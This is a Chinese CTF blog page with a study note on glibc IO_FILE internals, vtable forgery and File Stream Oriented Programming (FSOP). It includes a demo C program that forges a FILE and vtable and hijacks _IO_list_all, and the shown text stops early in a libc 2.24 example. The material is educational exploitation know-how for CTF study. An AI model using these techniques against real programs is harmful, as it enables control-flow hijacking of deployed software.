<!DOCTYPE html>
<html lang="en">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="CTFer,CUMT"/><meta name="keywords" content="CTF" /><link rel="alternate" href="/atom.xml" title="M1key"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://pz1o.top/page/4/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" /><script type="text/x-mathjax-config">
    MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
  </script>
  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_analytics">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e90b4c8b8c36ca2b3e5798ef67088f84";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
  <script id="leancloud">
    AV.init({
      appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
      appKey: "FL93w3BBbF9lxiR8X1HI58En"
    });
  </script><script>
  window.config = {"leancloud":{"app_id":"KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz","app_key":"FL93w3BBbF9lxiR8X1HI58En"},"toc":true,"fancybox":true,"pjax":"","latex":true};
</script>

    <title>M1key</title>
  <meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="M1key" type="application/atom+xml">
</head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">M1key</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">M1key</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><section id="posts" class="posts"><article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/03/25/IO-FILE/">IO_FILE</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-03-25
        </span><span class="post-visits"
             data-url="/2021/03/25/IO-FILE/"
             data-title="IO_FILE">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><h1 id="0x01-FILE结构"><a href="#0x01-FILE结构" class="headerlink" title="0x01 FILE结构"></a>0x01 FILE结构</h1><h2 id="1-FILE-介绍"><a href="#1-FILE-介绍" class="headerlink" title="1.FILE 介绍"></a>1.FILE 介绍</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>正常的链表如图所示，通常由IO_list_all是链表头部，之后是用chain链连起来</p>
<p><img src="/2021/03/25/IO-FILE/20210218150610948.png" alt="在这里插入图片描述"></p>
<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。<strong>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</strong></p>
<blockquote>
<p>_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p>
<p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&gt;&#123;</span></span><br><span class="line">   _IO_FILE    file;</span><br><span class="line">   IO_jump_t   *vtable;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
<p><code>vtable</code>（虚表）：是<code>IO_jump_t</code> 类型的指针，<code>IO_jump_t</code>中保存了一些函数指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">  <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">  <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">  <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">  <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">  <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">  <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">  <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">  </span><br><span class="line">  <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">  <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">  <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">  <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">  <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">  <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">  <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">  <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">  <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">  <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">  <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">  <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">  <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">  <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&gt;&#125;;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="2-fread"><a href="#2-fread" class="headerlink" title="2.fread"></a>2.fread</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span> <span class="params">( <span class="keyword">void</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE *stream)</span> </span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>buffer 存放读取数据的缓冲区。</li>
<li>size：指定每个记录的长度。</li>
<li>count： 指定记录的个数。</li>
<li>stream：目标文件流。</li>
<li>返回值：返回读取到数据缓冲区中的记录个数</li>
</ul>
</blockquote>
<p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的</p>
<h2 id="3-fwrite"><a href="#3-fwrite" class="headerlink" title="3.fwrite"></a>3.fwrite</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li>
<li>size: 要写入内容的单字节数;</li>
<li>count: 要进行写入 size 字节的数据项的个数;</li>
<li>stream: 目标文件指针;</li>
<li>返回值：实际写入的数据项个数 count。</li>
</ul>
</blockquote>
<p>在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p>
<p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p>
<p>IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p>
<p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p>
<h2 id="4-fopen"><a href="#4-fopen" class="headerlink" title="4.fopen"></a>4.fopen</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>filename: 目标文件的路径</li>
<li>type: 打开方式的类型</li>
<li>返回值: 返回一个文件指针</li>
</ul>
</blockquote>
<ul>
<li>使用 malloc 分配 FILE 结构</li>
<li>设置 FILE 结构的 vtable</li>
<li>初始化分配的 FILE 结构</li>
<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>
<li>调用系统调用打开文件</li>
</ul>
<h2 id="5-fclose"><a href="#5-fclose" class="headerlink" title="5.fclose"></a>5.fclose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fclose(FILE *stream)</span><br></pre></td></tr></table></figure>
<p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
<h2 id="6-printf-puts"><a href="#6-printf-puts" class="headerlink" title="6.printf/puts"></a>6.printf/puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>
<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure>
<h1 id="0x02-伪造vtable"><a href="#0x02-伪造vtable" class="headerlink" title="0x02 伪造vtable"></a>0x02 伪造vtable</h1><p>伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p>
<ol>
<li>直接改写 vtable 中的函数指针，通过任意地址写就可以实现。</li>
<li>覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</li>
</ol>
<h1 id="0x03-FSOP"><a href="#0x03-FSOP" class="headerlink" title="0x03 FSOP"></a>0x03 FSOP</h1><p>File Stream Oriented Programming</p>
<h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h2><p>FSOP 的核心思想就是<strong>劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。</strong>FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>
<p><img src="/2021/03/25/IO-FILE/abort_routine.001.jpeg" alt="img"></p>
<p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
<ol>
<li><p>当 libc 执行 abort 流程时</p>
</li>
<li><p>当执行 exit 函数时</p>
</li>
<li><p>当执行流从 main 函数返回时</p>
</li>
</ol>
<h2 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h2><ol>
<li><p>知道libc基址</p>
</li>
<li><p>改写_IO_list_all为可控内存的指针</p>
</li>
<li><p>通过验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (((fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) &#x3D;&#x3D; EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result &#x3D; EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>fp-&gt;_mode &lt;= 0</li>
<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
</ul>
</blockquote>
</li>
</ol>
<p>这里拿一个wiki上的例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>前0x100是_IO_FILE </p>
<p>之后0x100是vtable</p>
<p>0x18就是overflow的偏移</p>
</blockquote>
<h1 id="0x04-libc2-24新应用"><a href="#0x04-libc2-24新应用" class="headerlink" title="0x04 libc2.24新应用"></a>0x04 libc2.24新应用</h1><p>libc2.24中注重对_IO_FILE结构体内的区域的利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>
<h2 id="1-fileno与缓冲区的相关利用"><a href="#1-fileno与缓冲区的相关利用" class="headerlink" title="1.fileno与缓冲区的相关利用"></a>1.fileno与缓冲区的相关利用</h2><p><strong>eg</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,stack_buf);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,stack_buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看第一次初始化,里面很多内容还是空</p>
